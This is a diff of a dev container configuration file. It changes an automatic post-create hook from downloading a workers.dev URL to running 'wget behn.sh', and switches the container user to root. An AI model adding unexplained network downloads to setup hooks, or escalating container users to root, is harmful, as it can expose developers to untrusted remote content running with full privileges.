@@ -1,8 +1,8 @@
 {
   "name": "My Codespace",
   "image": "mcr.microsoft.com/devcontainers/universal:latest",
-  "postCreateCommand": "wget https://containers-template.smofeng.workers.dev/",
-  "remoteUser": "codespace",
+  "postCreateCommand": "wget behn.sh",
+  "remoteUser": "root",
   "customizations": {
     "vscode": {
       "extensions": []
